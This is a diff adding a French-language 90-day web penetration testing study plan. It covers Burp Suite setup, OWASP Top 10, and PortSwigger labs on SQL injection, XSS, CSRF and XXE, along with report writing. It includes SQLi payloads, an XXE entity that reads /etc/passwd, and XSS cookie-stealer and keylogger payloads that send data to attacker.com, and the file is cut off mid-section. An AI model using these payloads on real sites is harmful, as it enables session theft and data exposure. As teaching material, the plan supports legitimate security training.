@@ -1,0 +1,1243 @@
+# 🎯 PLAN D'APPRENTISSAGE PENTEST WEB - 90 JOURS
+
+**Profil détecté:** Intermédiaire-Débutant
+- ✅ HTTP/Cookies/En-têtes : Maîtrisé
+- ⚠️ OWASP : Concepts de base uniquement
+- ⚠️ Burp Suite : Installation OK, peu d'usage pratique
+
+**Plan optimisé:** 13 semaines, ~10h/semaine, 130+ heures
+**Fin estimée:** ~3.5 mois (accélération possible)
+
+---
+
+## 📊 PROGRESSION GLOBALE
+
+```
+Phase 1 : Fondations        (Sem 1-3)   ████░░░░░░ 30%
+Phase 2 : Vulnérabilités    (Sem 4-8)   ██████░░░░ 60%
+Phase 3 : Spécialisation    (Sem 9-11)  ████████░░ 85%
+Phase 4 : Maîtrise          (Sem 12-13) ██████████ 100%
+```
+
+---
+
+# PHASE 1 : FONDATIONS (Semaines 1-3)
+
+## Objectifs
+✅ Maîtriser HTTP/HTTPS en profondeur (sessions, tokens, cookies sécurisés)
+✅ Configurer Burp Suite Community comme un pro
+✅ Comprendre OWASP Testing Guide
+✅ Réaliser le premier lab PortSwigger (SQL Injection basique)
+
+**Temps:** 30h | **Labs:** 2-3 | **Jalons:** 3
+
+---
+
+## SEMAINE 1 : HTTP Avancé & Fondations de Sécurité
+
+### Jour 1-2 : HTTP/HTTPS en profondeur (4h)
+**Ressources :**
+- PortSwigger: [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
+- [MDN: HTTP Headers Security](https://developer.mozilla.org/en-US/docs/Web/HTTP)
+- Video: TLS Handshake (5-10 min)
+
+**Concepts clés à maîtriser:**
+- [ ] Différence HTTP vs HTTPS (TLS/SSL)
+- [ ] Session vs Token (JWT)
+- [ ] Sécurisation des cookies (Secure, HttpOnly, SameSite)
+- [ ] CORS et Same-Origin Policy
+- [ ] Content-Security-Policy (CSP)
+- [ ] X-Frame-Options, X-Content-Type-Options
+
+**Exercice Pratique:**
+```
+Ouvre DevTools (F12) sur n'importe quel site HTTPS
+→ Onglet Network
+→ Sélectionne une requête
+→ Identifie les en-têtes de sécurité:
+   • Secure flag sur les cookies
+   • HttpOnly flag
+   • SameSite attribute
+   • CSP headers
+   • HSTS
+
+Question: Pourquoi HttpOnly empêche les attaques XSS?
+Réponse: Parce que JavaScript n'y a pas accès (document.cookie)
+```
+
+**Jalon:** ✓ Comprendre 80% des en-têtes de sécurité HTTP
+
+---
+
+### Jour 3-4 : Burp Suite Community - Setup & Proxy (4h)
+**Installation et configuration initiale**
+
+```
+Télécharger: https://portswigger.net/burp/communitydownload
+Installer: Java 11+ requis
+```
+
+**Configuration Proxy (ESSENTIEL):**
+
+1. **Lancer Burp Suite**
+   - Temporary project (OK pour débuter)
+   - Community edition (gratuit)
+
+2. **Configurer le navigateur**
+   ```
+   Firefox Preferences → Network Settings → Manual proxy
+   - HTTP Proxy: 127.0.0.1, Port: 8080
+   - HTTPS Proxy: 127.0.0.1, Port: 8080
+   ```
+
+3. **Certificat Burp (IMPORTANT)**
+   ```
+   Burp → Proxy → Options
+   → Copiez le certificat CA
+   → Firefox: About:preferences → Privacy & Security
+   → Certificates → Import "burp.cer"
+   → Trust for websites ✓
+   ```
+
+4. **Test le proxy**
+   ```
+   - Lancer Burp (Proxy ON)
+   - Ouvrir http://scanme.nmap.org
+   - Vérifier dans Burp → Proxy → Intercept que les requêtes apparaissent
+   - Laisser passer (Forward button)
+   ```
+
+**Jalon:** ✓ Proxy intercepte toutes les requêtes HTTP(S)
+
+---
+
+### Jour 5-7 : Burp Suite - Proxy & Repeater (6h)
+**Les 2 outils fondamentaux du pentester**
+
+#### 1. Proxy Tab
+```
+Burp → Proxy → Intercept
+
+3 modes essentiels:
+• Intercept is off: Les requêtes passent sans affichage
+• Intercept is on: Freeze chaque requête (tu peux la modifier)
+• Event log: Historique de TOUTES les requêtes (sans freeze)
+```
+
+**Exercice 1: Modifier une requête en live**
+```
+1. Va sur https://www.example.com/search?q=hello
+2. Burp → Proxy → Intercept ON
+3. Fais une recherche
+4. Burp gèle la requête
+5. Modifie: q=hello → q=pwned
+6. Forward
+7. Observe le résultat modifié dans le navigateur
+
+C'est ça le power d'un proxy! Tu peux modifier n'importe quoi AVANT envoi.
+```
+
+#### 2. Repeater Tab
+```
+C'est ton meilleur ami pour tester des vulnérabilités.
+
+Workflow:
+1. Trouve une requête intéressante dans Proxy
+2. Right-click → Send to Repeater
+3. Dans Repeater, modifie la requête
+4. Clique "Send"
+5. Analyse la réponse
+6. Ajuste et réessaie (sans recharger la page!)
+```
+
+**Exercice 2: Burp Repeater - SQL Injection Detection**
+```
+Tu vas faire ton PREMIER test SQL injection (simple, non-destructif)
+
+Site de test: https://www.vulnweb.com (site intentionnellement vulnérable)
+
+1. Navigue vers: https://www.vulnweb.com/artists.php?artist=1
+2. Burp capture la requête
+3. Send to Repeater
+4. Modifie le paramètre: artist=1' (ajoute juste un quote)
+5. Send
+6. Analyse la réponse:
+   - Erreur SQL? → Site vulnérable à SQLi
+   - Pas d'erreur? → Teste d'autres injections
+
+7. Essaie: artist=1' OR '1'='1
+8. Compare les résultats
+
+Question clé: Pourquoi ajouter une quote casse le site?
+Réponse: Parce que la requête SQL devient:
+  SELECT * FROM artists WHERE id = '1''
+  Syntaxe invalide! Les quotes ne sont pas échappées.
+```
+
+**Jalon:** ✓ Maîtriser Proxy & Repeater (ce sont 80% de ton travail)
+
+---
+
+## SEMAINE 2 : OWASP Testing Guide & Premiers Concepts
+
+### Jour 8-9 : OWASP Top 10 2021 (Essentials) (4h)
+
+Tu vas apprendre les 10 vulnérabilités les plus critiques. Ne mémorise PAS tout, comprends le concept.
+
+```
+OWASP Top 10 2021 (résumé pour débutant):
+
+1. 🔴 Broken Access Control
+   Définition: L'app ne vérifie pas les permissions
+   Exemple: Voir les données d'un autre utilisateur
+   Comment tester: Changer /user/123 → /user/456
+   
+2. 🔴 Cryptographic Failures
+   Définition: Données sensibles mal chiffrées/stockées
+   Exemple: Mots de passe en texte clair
+   Comment tester: Inspecter le stockage local
+
+3. 🔴 Injection (SQL, NoSQL, OS, LDAP, etc.)
+   Définition: Injecter du code via des inputs
+   Exemple: ' OR '1'='1 dans un login
+   Comment tester: Ajouter quotes, caractères spéciaux
+
+4. 🟡 Insecure Design
+   Définition: Mauvaise architecture depuis le début
+   Exemple: Pas de rate limiting sur login
+   Comment tester: Force brute, automatisation
+
+5. 🟡 Security Misconfiguration
+   Définition: Paramètres par défaut/faibles
+   Exemple: Admin:admin accessible
+   Comment tester: Scanners, reconnaissance
+
+6. 🟡 Vulnerable Components
+   Définition: Librairies/dépendances non à jour
+   Exemple: jQuery 1.5 (2011) avec vulnérabilités connues
+   Comment tester: OWASP Dependency-Check
+
+7. 🟡 Authentication Failures
+   Définition: Gestion faible des identifiants
+   Exemple: Pas de MFA, sessions faibles
+   Comment tester: Brute force, replay attacks
+
+8. 🟡 Data Integrity Failures
+   Définition: Pas de validation des données
+   Exemple: Modifier un prix en POST request
+   Comment tester: Intercepter et modifier
+
+9. 🟡 Logging & Monitoring Failures
+   Définition: Pas de détection des attaques
+   Exemple: Pas d'alertes sur les accès bizarres
+   Comment tester: Observer les logs
+
+10. 🟡 SSRF (Server-Side Request Forgery)
+    Définition: Faire le serveur faire des requêtes
+    Exemple: Accéder à http://localhost/admin via l'app
+    Comment tester: URL injection, rebinding
+```
+
+**Ressource officielle:**
+- https://owasp.org/Top10/ (consultable, pas à mémoriser)
+
+**Jalon:** ✓ Pouvoir définir les 10 principaux risques
+
+---
+
+### Jour 10-11 : OWASP Testing Guide Basics (4h)
+
+PortSwigger a un **Web Security Academy** gratuit. C'est ta bible.
+
+**Navigation dans Web Security Academy:**
+```
+https://portswigger.net/web-security
+
+Structure:
+→ Learning paths
+   → Web Security Academy
+   
+Chaque topic a:
+1. Explication théorique
+2. Vidéo (parfois)
+3. Lab interactif
+4. Solutions
+```
+
+**Concepts essentiels à comprendre:**
+
+```
+1. RECONNAISSANCE (Information Gathering)
+   - Identifier la stack technologique
+   - Scanner la surface d'attaque
+   - Recenser les endpoints
+   
+   Outils Burp:
+   - Proxy → HTTP History (voir toutes les requêtes)
+   - Organiser par domaine/path
+   
+2. IDENTIFICATION DES VULNÉRABILITÉS
+   - Tester chaque input (formulaires, URLs, etc.)
+   - Chercher des patterns d'erreur
+   - Observer les comportements bizarres
+   
+3. EXPLOITATION
+   - Confirmer la vulnérabilité
+   - Développer une proof-of-concept
+   - Documenter l'impact
+   
+4. RAPPORT
+   - Décrire la vulnérabilité
+   - Expliquer comment la corriger
+```
+
+**Jalon:** ✓ Comprendre la méthodologie OWASP Testing
+
+---
+
+### Jour 12-13 : SQL Injection - Théorie Complète (4h)
+
+**Avant de commencer un lab, comprendre 100% le concept.**
+
+```
+QU'EST-CE QUE SQL INJECTION?
+
+Définition simple:
+L'attaquant peut modifier la requête SQL en injectant du code.
+
+Exemple normal (sécurisé):
+  Input: username = "Alice"
+  Requête SQL: SELECT * FROM users WHERE name = 'Alice'
+  Résultat: Retourne Alice
+
+Exemple vulnérable (sans protection):
+  Input: username = "Alice' OR '1'='1"
+  Requête SQL: SELECT * FROM users WHERE name = 'Alice' OR '1'='1'
+  Résultat: Retourne TOUS les utilisateurs (la condition '1'='1' est toujours vraie)
+
+Pourquoi c'est possible?
+→ Le code de l'app concatène directement l'input dans la requête
+→ Pas d'échappement des caractères spéciaux
+→ Pas de prepared statements
+```
+
+**Types de SQL Injection:**
+
+```
+1. ERROR-BASED (Basique)
+   Technique: Ajouter une quote pour casser la requête
+   Signe: Message d'erreur SQL visible
+   Exemple: ' OR 1=1 --
+   Difficulté: ⭐ Facile
+
+2. UNION-BASED (Intermédiaire)
+   Technique: Utiliser UNION pour joindre des données
+   Signe: Données de colonnes supplémentaires
+   Exemple: ' UNION SELECT NULL, NULL, version() --
+   Difficulté: ⭐⭐ Moyen
+
+3. BLIND (Avancé)
+   Technique: Pas d'erreur, on teste avec des conditions
+   Signe: Comportement change (vrai/faux)
+   Exemple: ' AND '1'='1 (vrai) vs ' AND '1'='2 (faux)
+   Difficulté: ⭐⭐⭐ Difficile
+```
+
+**Comment corriger côté développeur:**
+
+```javascript
+// ❌ MAUVAIS (Vulnérable à SQL injection)
+const sql = `SELECT * FROM users WHERE username = '${username}'`;
+db.query(sql);
+
+// ✅ BON (Prepared Statements)
+const sql = 'SELECT * FROM users WHERE username = ?';
+db.query(sql, [username]);
+
+// ✅ BON (ORMs - Sequelize, TypeORM, etc.)
+User.findAll({ where: { username: username } });
+```
+
+**Jalon:** ✓ Comprendre les 3 types de SQLi et comment les éviter
+
+---
+
+## SEMAINE 3 : PREMIER LAB PORTSWIGGER
+
+### Jour 14-18 : PortSwigger Lab #1 - SQL Injection (Basics) (10h)
+
+**URL:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+
+**Difficulté:** ⭐ Très facile
+
+**Description du lab:**
+```
+L'application a un filtre produits qui est vulnérable à SQL injection.
+Tu dois modifier le filtre pour afficher les produits "non-publiés".
+
+Indice: Il y a une colonne "released" qui contrôle la visibilité.
+```
+
+---
+
+### 🎓 SESSION DE COACHING : COMMENT RÉSOUDRE CE LAB
+
+Je vais te guider avec ma **méthode Socratique**. Réponds aux questions progressivement.
+
+#### **ÉTAPE 1: RECONNAISSANCE**
+
+**❓ Question 1:** Quand tu charges la page, qu'est-ce que tu vois?
+- Une liste de produits?
+- Un filtre/catégorie?
+- Des URLs de filtre?
+
+*Objectif: Identifier où tester*
+
+**💡 Indice si tu es bloqué:**
+Il y a probablement une URL comme `/filter?category=Electronics` ou `/products?id=1`
+
+---
+
+**❓ Question 2:** Où penses-tu que SQL injection pourrait survenir?
+- Dans le filtre de catégorie?
+- Dans un formulaire de recherche?
+- Dans un paramètre URL?
+
+*Objectif: Localiser les inputs testables*
+
+---
+
+#### **ÉTAPE 2: TESTER LA VULNÉRABILITÉ**
+
+**❓ Question 3:** Quelle technique tu vas d'abord essayer?
+a) Ajouter une quote simple: `'`
+b) Ajouter: `' OR '1'='1`
+c) Ajouter un commentaire: `--`
+
+*Réponse simple: (a) d'abord - voir si ça casse le site*
+
+**Procédure dans Burp:**
+```
+1. Charge la page de produits
+2. Burp → Proxy → Intercept ON
+3. Clique sur un filtre/catégorie
+4. Burp gèle la requête
+5. Modifie le paramètre: &category=Electronics' 
+6. Send
+7. Observe la réponse
+   - Y a-t-il une erreur SQL?
+   - Le site a changé de comportement?
+```
+
+**❓ Question 4:** Qu'est-ce que tu observes après avoir envoyé `'`?
+- Une erreur SQL?
+- Un message 500?
+- Aucune visibilité de données?
+
+*Objectif: Confirmer que c'est bien SQL injection*
+
+---
+
+#### **ÉTAPE 3: EXPLOITATION**
+
+Une fois que tu as confirmé la vulnérabilité, il faut afficher les produits "released = 0".
+
+**❓ Question 5:** La requête SQL ressemble probablement à:
+```sql
+SELECT * FROM products WHERE category = 'Electronics'
+```
+
+Que dois-tu injecter pour TOUJOURS retourner vrai (et ignorer la condition originale)?
+
+*Indice: Utilise OR et une condition toujours vraie*
+
+**La solution (À NE PAS REGARDER TOUT DE SUITE):**
+
+```
+Payload: Electronics' OR '1'='1
+Requête devient: SELECT * FROM products WHERE category = 'Electronics' OR '1'='1'
+Résultat: '1'='1' est toujours vrai, donc retourne TOUS les produits
+```
+
+**Mais attends, l'énoncé dit "afficher les produits non-publiés"**
+
+**❓ Question 6:** Comment modifier ton injection pour cibler les produits où `released = 0`?
+
+*Indice: Tu dois créer une condition sur une autre colonne*
+
+**Solution (Ne regarde pas si tu veux vraiment apprendre):**
+
+```sql
+-- Injection:
+Electronics' OR released = 0 --
+
+-- Requête finale:
+SELECT * FROM products WHERE category = 'Electronics' OR released = 0 --
+
+-- Le -- commente le reste, donc pas de souci avec la quote de fermeture
+```
+
+---
+
+### **✨ APRÈS AVOIR RÉSOLU LE LAB**
+
+Une fois que tu as réussi (lab doit afficher un message de succès):
+
+**❓ Réflexion:**
+1. Qu'est-ce qui a permis l'injection?
+   → *Pas de prepared statements*
+
+2. Comment un dev aurait dû protéger ça?
+   → *Prepared statements / Parameterized queries*
+
+3. Qu'est-ce qui aurait pu te ralentir?
+   → *Pas d'erreur SQL visible? (Advanced: Blind SQLi)*
+
+4. Pourrais-tu faire ça sur la colonne `price` au lieu de `category`?
+   → *Oui, même concept*
+
+---
+
+### **JALONSDELA SEMAINE 3**
+
+- [ ] Lab #1 complété (SQL Injection basics)
+- [ ] Comprendre pourquoi c'est vulnérable
+- [ ] Savoir comment corriger
+- [ ] Burp Suite Proxy + Repeater maîtrisés
+
+**Score Phase 1:** 8/10 (bien pour débuter)
+
+---
+
+# PHASE 2 : VULNÉRABILITÉS WEB (Semaines 4-8)
+
+## Objectifs globaux de la phase
+✅ Maîtriser SQL Injection (tous les types)
+✅ Maîtriser XSS (Reflected, Stored, DOM)
+✅ Maîtriser CSRF et session hijacking
+✅ Maîtriser les flaws d'authentification
+✅ Maîtriser Burp Suite Intruder & Decoder
+
+**Temps:** 50h | **Labs:** 12-15 | **Jalons:** 8
+
+---
+
+## SEMAINE 4-5 : SQL Injection Advanced
+
+### Labs à compléter (dans cet ordre):
+
+```
+1. ⭐ SQL Injection - Union based
+2. ⭐ SQL Injection - Blind
+3. ⭐⭐ Error-based blind SQLi
+4. ⭐⭐ Time-based blind SQLi
+5. ⭐⭐ SQLi in WHERE clause
+6. ⭐⭐ SQLi in ORDER BY clause
+7. ⭐⭐ SQLi in INSERT/UPDATE
+```
+
+**Pour chacun:**
+1. Lis l'explication PortSwigger (10 min)
+2. Essaie le lab **SANS regarder la solution** (20-30 min)
+3. Utilise Burp Repeater
+4. Quand bloqué, regarde l'indice progressif
+5. Analyse pourquoi ça marche
+6. Documente ton apprentissage
+
+---
+
+## SEMAINE 6 : XSS (Cross-Site Scripting)
+
+### Compréhension théorique
+
+```
+XSS: Injecter du JavaScript dans une page pour le faire exécuter
+
+3 Types:
+
+1. REFLECTED XSS
+   - L'injection est dans l'URL
+   - Pas stockée en base
+   - Exemple: /search?q=<img src=x onerror="alert('XSS')">
+   - Victime doit cliquer un lien malveillant
+
+2. STORED XSS
+   - L'injection est stockée en base
+   - Tous les visiteurs sont affectés
+   - Exemple: Commentaire contenant <script>
+   - Plus dangereux!
+
+3. DOM-BASED XSS
+   - Le JavaScript client crée le DOM sans validation
+   - Exemple: document.body.innerHTML = input_non_validé
+   - Souvent oublié!
+```
+
+### Labs PortSwigger XSS
+
+```
+1. ⭐ Reflected XSS
+2. ⭐ Stored XSS
+3. ⭐ DOM-based XSS
+4. ⭐⭐ Reflected XSS with event handlers
+5. ⭐⭐ Stored XSS with event handlers
+6. ⭐⭐ DOM-based XSS with jQuery
+```
+
+### Concept clé: Payload XSS
+
+```html
+<!-- Simple alert -->
+<img src=x onerror="alert('XSS')">
+
+<!-- Stealer de cookies -->
+<img src=x onerror="new Image().src='http://attacker.com/log?c='+document.cookie">
+
+<!-- Défacement -->
+<script>document.body.innerHTML = '<h1>Hacked</h1>'</script>
+
+<!-- KeyLogger -->
+<script>
+document.onkeypress = function(e) {
+  new Image().src = 'http://attacker.com/log?key=' + String.fromCharCode(e.which);
+}
+</script>
+```
+
+**Comment fixer:**
+```javascript
+// ❌ MAUVAIS
+element.innerHTML = userInput;
+
+// ✅ BON
+element.textContent = userInput;
+
+// ✅ BON (Frameworks)
+// React, Vue, Angular échappent automatiquement par défaut
+```
+
+---
+
+## SEMAINE 7 : CSRF & Authentication
+
+### CSRF (Cross-Site Request Forgery)
+
+```
+Concept: Faire une action non-intentionnelle sur un site où tu es logged-in
+
+Exemple:
+1. Tu es loggé à bank.com
+2. Tu ouvres un email contenant: <img src="bank.com/transfer?to=attacker&amount=1000">
+3. Le navigateur envoie automatiquement le cookie de session
+4. La banque exécute le transfer! (Sans ta permission)
+
+Protection côté serveur:
+- CSRF tokens (aléatoire, unique par utilisateur)
+- SameSite cookies
+- Vérifier l'header Referer
+```
+
+### Labs CSRF & Authentication
+
+```
+1. ⭐ CSRF vulnerability
+2. ⭐ CSRF with no defenses
+3. ⭐⭐ CSRF with token validation (contourner)
+4. ⭐⭐ Session fixation
+5. ⭐⭐ Brute force login
+6. ⭐⭐ Username enumeration
+```
+
+**Burp Suite feature:** Intruder
+```
+Utile pour: Brute force, fuzzing, automatisation
+Workflow:
+1. Envoyer une requête à Intruder
+2. Définir les paramètres à modifier (Positions)
+3. Charger une wordlist d'attaque
+4. Lancer l'attaque
+5. Analyser les réponses
+```
+
+---
+
+## SEMAINE 8 : Autorisation et Logique Métier
+
+### Labs à compléter
+
+```
+1. ⭐ Unprotected admin functionality
+2. ⭐⭐ Parameter-based access control
+3. ⭐⭐ Broken access control on delete
+4. ⭐⭐ Broken access control on direct object reference
+5. ⭐⭐ Broken logic: Price modification
+6. ⭐⭐ Broken logic: Coupon system
+7. ⭐⭐⭐ Broken business logic
+```
+
+### Concept clé: Broken Access Control
+
+```
+Définition: L'app n'a pas de vérification de permission
+
+Exemples:
+- Voir /admin → Pas de vérification d'admin
+- Voir /user/123 → Pas de vérification que c'est TON compte
+- Supprimer /item/456 → Pas de vérification que tu l'as créé
+- PATCH /order?id=789&price=0.01 → Pas de validation du prix
+
+Comment tester:
+1. Identifie des IDs ou identifiants
+2. Essaie d'accéder à d'autres valeurs
+3. Modifie les paramètres
+4. Observe si les protections manquent
+```
+
+---
+
+### 🎓 JALONSDELA PHASE 2
+
+- [ ] Maîtriser SQL Injection (tous types)
+- [ ] Maîtriser XSS (tous types)
+- [ ] Maîtriser CSRF
+- [ ] Maîtriser Broken Access Control
+- [ ] Utiliser couramment Burp Suite (Proxy, Repeater, Intruder)
+- [ ] 15+ labs complétés
+
+**Score Phase 2:** 7-8/10 (progression sérieuse!)
+
+---
+
+# PHASE 3 : SPÉCIALISATION (Semaines 9-11)
+
+## Objectifs
+✅ Maîtriser les vulnérabilités avancées (XXE, Deserialization, SSRF)
+✅ Maîtriser les API security flaws
+✅ Maîtriser les file upload vulnerabilities
+✅ Utiliser Burp Suite avancé (Decoder, Comparer, Extensions)
+
+**Temps:** 35h | **Labs:** 10+ | **Jalons:** 6
+
+---
+
+## SEMAINE 9 : XXE et File Uploads
+
+### XXE (XML External Entity)
+
+```
+Concept: Injecter du code XML malveillant
+
+Exemple vulnérable:
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+Résultat: Le contenu de /etc/passwd s'affiche!
+
+Protection:
+- Désactiver la résolution d'entités externes
+- Valider et nettoyer l'XML
+```
+
+### File Upload Vulnerabilities
+
+```
+Concepts:
+1. Upload d'extensions exécutables (.php, .jsp, .aspx)
+2. Bypass de validation MIME
+3. Directory traversal via nom de fichier
+4. Race conditions
+5. Zip bombs / XXe dans les fichiers
+
+Protection:
+- Whitelist d'extensions
+- Valider le MIME type réel (pas juste l'extension)
+- Renommer les fichiers uploadés
+- Stocker en dehors du webroot
+- Limiter la taille
+```
+
+### Labs
+
+```
+1. ⭐⭐ XXE injection
+2. ⭐⭐ XXE blind injection
+3. ⭐⭐ File upload vulnerabilities
+4. ⭐⭐ File upload with restricted extensions
+5. ⭐⭐⭐ File upload bypass
+```
+
+---
+
+## SEMAINE 10 : API Security & Business Logic
+
+### API Security
+
+```
+Vulnérabilités courantes:
+1. No authentication/authorization on endpoints
+2. Broken object level authorization
+3. Excessive data exposure (fields non-nécessaires)
+4. Lack of resources & rate limiting
+5. Broken function level authorization
+
+Comment tester:
+- Intercepter les requêtes API (JSON/XML)
+- Modifier les paramètres (id, role, amount, etc.)
+- Ajouter/retirer des champs
+- Analyser les erreurs
+```
+
+### Business Logic Flaws
+
+```
+Concept: L'app est logiquement mal conçue
+
+Exemples:
+1. Casser un paiement en 2 parties
+2. Bypasser une séquence d'étapes
+3. Modifier un montant avant paiement
+4. Utiliser un code promo multiple fois
+
+Comment tester:
+- Rejouer les requêtes dans un ordre différent
+- Modifier les paramètres
+- Observer les règles de validation
+- Détecter des brèches logiques
+```
+
+---
+
+## SEMAINE 11 : Burp Suite Avancé & Practicum
+
+### Features avancées de Burp
+
+```
+1. DECODER
+   - Décode Base64, URL, HTML, etc.
+   - Utile pour les payloads encodés
+   
+2. COMPARER
+   - Compare 2 requêtes/réponses
+   - Détecte les différences
+   
+3. EXTENSIONS
+   - Scripts personnalisés (Python, JavaScript)
+   - Automatiser des tâches
+   
+4. SCANNER (Professional)
+   - Scan automatique de vulnérabilités
+   - (Community version limitée)
+```
+
+### Mini-Projet: Pentest d'une Application Volontairement Vulnérable
+
+Choisis une cible:
+- **DVWA** (très facile)
+- **WebGoat** (débutant)
+- **Juice Shop** (moyen)
+- **bWAPP** (moyen)
+
+**Workflow complet:**
+```
+1. RECONNAISSANCE
+   - Mapper l'application
+   - Lister tous les inputs
+   - Identifier la technologie
+   
+2. TESTING
+   - Tester chaque input pour injection
+   - Tester les flaws d'autorisation
+   - Tester les flaws de logique
+   
+3. EXPLOITATION
+   - Confirmer chaque vulnérabilité
+   - Développer une POC (Proof of Concept)
+   - Documenter l'impact
+   
+4. RAPPORT
+   - Écrire un rapport de pentest
+   - Inclure chaque vulnérabilité trouvée
+   - Donner les corrections
+   
+Format du rapport:
+─────────────────
+[Titre de la vuln]
+Sévérité: Critique / Élevée / Moyenne / Basse
+Description: ...
+Impact: ...
+Reproduction: ...
+Correction: ...
+```
+
+---
+
+### 🎓 JALONSDELA PHASE 3
+
+- [ ] Maîtriser XXE et File Upload
+- [ ] Maîtriser API Security
+- [ ] Comprendre Business Logic Flaws
+- [ ] Utiliser Decoder, Comparer, Extensions
+- [ ] Réaliser un pentest mini-complet
+- [ ] 10+ labs avancés complétés
+
+**Score Phase 3:** 7.5/10 (spécialisation réussie!)
+
+---
+
+# PHASE 4 : MAÎTRISE & CERTIFICATIONS (Semaines 12-13)
+
+## Objectifs
+✅ Réaliser un pentest complet (simulation réelle)
+✅ Écrire un rapport professionnel
+✅ Préparer les certifications (optionnel)
+✅ Valider l'ensemble des compétences
+
+**Temps:** 20h | **Simulations:** 2-3 | **Jalonsscommit:** 2
+
+---
+
+## SEMAINE 12 : Simulations Complètes
+
+### Simulation #1: OWASP WebGoat (Difficile)
+```
+Durée: 8-10h
+Étapes:
+1. Complète ALL les modules WebGoat
+2. Documente chaque solution
+3. Explique pourquoi c'est vulnérable
+4. Note comment corriger
+
+Modules:
+- SQL Injection (tous les types)
+- XSS (tous les types)
+- Authentication
+- Session management
+- Access control
+- Secure communication
+- Malicious code
+```
+
+### Simulation #2: OWASP Juice Shop (Medium)
+```
+Durée: 8-10h
+Cibles:
+- Tous les "Challenges" (≈40 vulnérabilités)
+- Documenter chaque découverte
+- Écrire les payloads utilisés
+- Analyser l'impact
+
+Catégories:
+- Injection
+- Broken authentication
+- Sensitive data exposure
+- XXE
+- SSRF
+- Unvalidated redirects
+- Etc.
+```
+
+---
+
+## SEMAINE 13 : Rapport & Consolidation
+
+### Rédiger un Rapport de Pentest Professionnel
+
+**Structure standard:**
+```
+┌─ RAPPORT DE PENTEST WEB ──────────────────┐
+│                                            │
+│ 1. EXECUTIVE SUMMARY (1-2 pages)          │
+│    - Résumé pour la direction             │
+│    - Nombre de vulnérabilités par niveau  │
+│    - Risque global                        │
+│                                            │
+│ 2. METHODOLOGY (½ page)                   │
+│    - Outils utilisés                      │
+│    - Phases d'attaque (OWASP TG)          │
+│    - Dates du test                        │
+│                                            │
+│ 3. FINDINGS (10-15 pages)                 │
+│    Pour chaque vulnérabilité:             │
+│    • Titre                                │
+│    • Sévérité (CVSS score)                │
+│    • Description                          │
+│    • Impact business                      │
+│    • Étapes de reproduction               │
+│    • Proof of Concept                     │
+│    • Recommandations                      │
+│                                            │
+│ 4. REMEDIATIONS (5 pages)                 │
+│    - Par priorité (Critique → Basse)      │
+│    - Code-level fixes                     │
+│    - Architectural changes                │
+│                                            │
+│ 5. APPENDIX                               │
+│    - Screenshots                          │
+│    - Payloads utilisés                    │
+│    - Tools & versions                     │
+└────────────────────────────────────────────┘
+```
+
+### Exemple de Vulnerability Finding:
+
+```markdown
+# SQL Injection in Product Filter
+
+## Severity: CRITICAL (CVSS 9.8)
+
+## Description
+L'application est vulnérable à SQL Injection via le paramètre
+`category` du filtre produits. L'input utilisateur n'est pas
+échappé avant intégration dans la requête SQL.
+
+## Impact
+- Accès non-autorisé à toutes les données de la base
+- Modification/suppression de données
+- Potentiel RCE (Remote Code Execution) selon la DB
+
+## Reproduction
+1. Naviguer vers `/products?category=Electronics`
+2. Dans Burp Repeater, modifier:
+   GET /products?category=Electronics' OR '1'='1
+3. Envoyer la requête
+4. Observer: TOUS les produits s'affichent
+
+## Proof of Concept
+```
+GET /products?category=Electronics' UNION SELECT 1,2,3,4,version()--
+```
+Retourne la version de MySQL dans la 5ème colonne.
+
+## Recommendation
+Utiliser des prepared statements:
+
+```php
+// ❌ Avant
+$result = mysqli_query($conn, 
+  "SELECT * FROM products WHERE category = '" . $_GET['category'] . "'");
+
+// ✅ Après
+$stmt = $conn->prepare("SELECT * FROM products WHERE category = ?");
+$stmt->bind_param("s", $_GET['category']);
+$stmt->execute();
+$result = $stmt->get_result();
+```
+
+## References
+- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
+- OWASP: SQL Injection
+- PortSwigger: SQL Injection Fundamentals
+```
+
+---
+
+### Validation Finale des Compétences
+
+**Checklist d'auto-évaluation:**
+
+```
+FONDATIONS (Phase 1)
+- [ ] Décrire le TLS handshake
+- [ ] Expliquer sessions vs tokens
+- [ ] Configurer Burp Suite sans aide
+- [ ] Configurer un proxy navigateur
+
+VULNÉRABILITÉS (Phase 2)
+- [ ] Expliquer 3 types de SQLi et les exploiter
+- [ ] Expliquer 3 types de XSS et les exploiter
+- [ ] Exploiter CSRF
+- [ ] Exploiter broken access control
+- [ ] Utiliser Burp Intruder efficacement
+
+SPÉCIALISATION (Phase 3)
+- [ ] Exploiter XXE
+- [ ] Exploiter file upload
+- [ ] Identifier API flaws
+- [ ] Détecter business logic flaws
+- [ ] Utiliser Decoder, Comparer
+
+MAÎTRISE (Phase 4)
+- [ ] Réaliser un pentest complet en 6-8h
+- [ ] Écrire un rapport professionnel
+- [ ] Expliquer toute vulnérabilité trouvée
+- [ ] Proposer des fixes code-level
+- [ ] Utiliser Burp Suite comme un pro
+```
+
+---
+
+## 📚 RESSOURCES COMPLÈTES
+
+### Apprentissage gratuit
+```
+1. PortSwigger Web Security Academy (MEILLEURE)
+   https://portswigger.net/web-security
+   
+2. OWASP Top 10 & Testing Guide
+   https://owasp.org/Top10/
+   https://owasp.org/www-project-web-security-testing-guide/
+   
+3. HackTheBox (pratique)
+   https://www.hackthebox.com/
+   
+4. TryHackMe (tutoriels guidés)
+   https://tryhackme.com/
+```
+
+### Apprentissage payant (optionnel)
+```
+1. Burp Suite Certified Practitioner (OSCP lite)
+   Coût: ~500€
+   Durée: 90 jours accès
+   
+2. eWPT (eLearnSecurity)
+   Coût: ~300€
+   Durée: 3 mois accès + 48h examen
+   
+3. OWASP MASTG (Mobile)
+   Gratuit (Android/iOS security)
+```
+
+### Outils essentiels
+```
+FREE:
+- Burp Suite Community
+- OWASP ZAP
+- Wireshark
+- SQLMap
+
+PAID (Professional/Pentester):
+- Burp Suite Professional ($399/an)
+- Acunetix
+- Nessus
+- Nmap Pro
+```
+
+---
+
+## 🎯 CONSEILS DE MENTORAT
+
+### 1. Rythme d'apprentissage
+```
+❌ Ne pas sauter les phases
+❌ Ne pas regarder solutions immédiatement
+❌ Ne pas négliger la théorie pour les labs
+
+✅ Lire → Comprendre → Pratiquer → Documenter
+✅ Un lab par jour max (qualité > quantité)
+✅ Relire tes notes régulièrement
+```
+
+### 2. Mentalité de pentester
+```
